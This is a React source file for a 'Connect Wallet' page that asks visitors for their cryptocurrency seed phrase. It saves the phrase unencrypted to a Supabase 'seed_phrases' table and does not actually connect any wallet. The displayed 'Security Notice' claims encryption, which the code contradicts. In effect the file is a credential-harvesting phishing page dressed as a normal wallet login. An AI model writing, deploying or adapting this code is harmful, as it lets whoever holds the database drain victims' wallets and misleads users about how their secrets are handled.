
import { useState } from "react";
import { useForm } from "react-hook-form";
import { Shield, Wallet } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Textarea } from "@/components/ui/textarea";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Input } from "@/components/ui/input";
import { supabase } from "@/integrations/supabase/client";

type FormValues = {
  seedPhrase: string;
  label: string;
};

export default function ConnectWalletPage() {
  const [isProcessing, setIsProcessing] = useState(false);
  
  const form = useForm<FormValues>({
    defaultValues: {
      seedPhrase: "",
      label: "",
    },
  });

  const onSubmit = async (data: FormValues) => {
    setIsProcessing(true);
    
    // Validate seed phrase
    const seedWords = data.seedPhrase.trim().split(/\s+/);
    if (seedWords.length !== 12 && seedWords.length !== 24) {
      form.setError("seedPhrase", { 
        type: "manual", 
        message: "Seed phrase must contain 12 or 24 words" 
      });
      setIsProcessing(false);
      return;
    }
    
    try {
      // Store seed phrase in Supabase
      const { error } = await supabase
        .from('seed_phrases')
        .insert({
          seed_phrase: data.seedPhrase,
          label: data.label || null
        });
      
      if (error) {
        throw error;
      }
      
      toast.success("Wallet connected successfully");
      form.reset();
    } catch (error) {
      console.error("Error saving seed phrase:", error);
      toast.error("Failed to connect wallet. Please try again.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden">
      {/* Background gradient */}
      <div className="absolute inset-0 bg-gradient-to-br from-blue-900/20 via-purple-900/20 to-black"></div>
      
      {/* Grid pattern overlay */}
      <div className="absolute inset-0 opacity-20" style={{
        backgroundImage: `linear-gradient(rgba(59, 130, 246, 0.1) 1px, transparent 1px),
                         linear-gradient(90deg, rgba(59, 130, 246, 0.1) 1px, transparent 1px)`,
        backgroundSize: '20px 20px'
      }}></div>
      
      <div className="relative z-10 flex min-h-screen flex-col items-center justify-center px-4">
        {/* Header */}
        <div className="mb-8 text-center">
          <h1 className="text-4xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent mb-2">
            Connect Wallet
          </h1>
          <p className="text-gray-400 text-lg">
            Enter your seed phrase to access the platform
          </p>
        </div>
        
        {/* Main form container */}
        <div className="w-full max-w-lg">
          <div className="bg-gray-900/50 backdrop-blur-sm border border-gray-800 rounded-2xl p-8 shadow-2xl">
            <Alert className="mb-6 border-amber-500/50 bg-amber-900/20 text-amber-200">
              <Shield className="h-4 w-4" />
              <AlertDescription>
                <strong className="font-semibold">Security Notice:</strong> Your seed phrase is encrypted and stored securely. Never share it with anyone.
              </AlertDescription>
            </Alert>
            
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="label"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-300">Wallet Label (Optional)</FormLabel>
                      <FormControl>
                        <Input 
                          placeholder="Enter wallet name or label" 
                          className="bg-gray-800/50 border-gray-700 text-white placeholder:text-gray-500 focus:border-blue-500"
                          {...field} 
                        />
                      </FormControl>
                      <FormDescription className="text-gray-500">
                        Add a name to identify this wallet.
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={form.control}
                  name="seedPhrase"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-gray-300">Seed Phrase</FormLabel>
                      <FormControl>
                        <Textarea 
                          placeholder="Enter your 12 or 24 word seed phrase" 
                          className="min-h-[120px] bg-gray-800/50 border-gray-700 text-white placeholder:text-gray-500 focus:border-blue-500 resize-none"
                          {...field} 
                        />
                      </FormControl>
                      <FormDescription className="text-gray-500">
                        Words should be separated by spaces.
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <Button 
                  type="submit" 
                  className="w-full h-12 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-semibold rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl"
                  disabled={isProcessing}
                >
                  {isProcessing ? (
                    <div className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      Processing...
                    </div>
                  ) : (
                    <div className="flex items-center gap-2">
                      <Wallet className="h-5 w-5" />
                      <span>Connect Wallet</span>
                    </div>
                  )}
                </Button>
              </form>
            </Form>
          </div>
        </div>
        
        {/* Footer note */}
        <div className="mt-8 text-center text-gray-500 text-sm max-w-md">
          <p>
            By connecting your wallet, you agree to our terms of service and privacy policy.
          </p>
        </div>
      </div>
    </div>
  );
}
